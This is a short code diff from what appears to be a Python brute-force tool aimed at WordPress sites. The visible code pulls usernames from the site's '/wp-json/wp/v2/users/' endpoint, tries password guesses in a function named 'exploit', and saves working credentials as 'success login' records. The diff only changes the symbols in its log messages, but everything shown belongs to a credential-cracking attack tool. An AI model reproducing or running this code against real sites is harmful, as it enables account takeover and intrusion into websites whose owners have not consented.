@@ -10,7 +10,7 @@ from termcolor import colored
 from concurrent.futures import ThreadPoolExecutor
 
 def fetching_user(url):
-	print(colored("[{}][!] Fetching user from {}".format(local_time(),url), "blue"))
+	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
 	user_list = []
 	try:
 		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
@@ -55,7 +55,7 @@ def exploit(url, user_url, list_password):
 			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
 		else:
-			print(colored("[{}][+] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
+			print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
 	except requests.exceptions.ConnectionError as e:
 		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
 	except Exception as e:
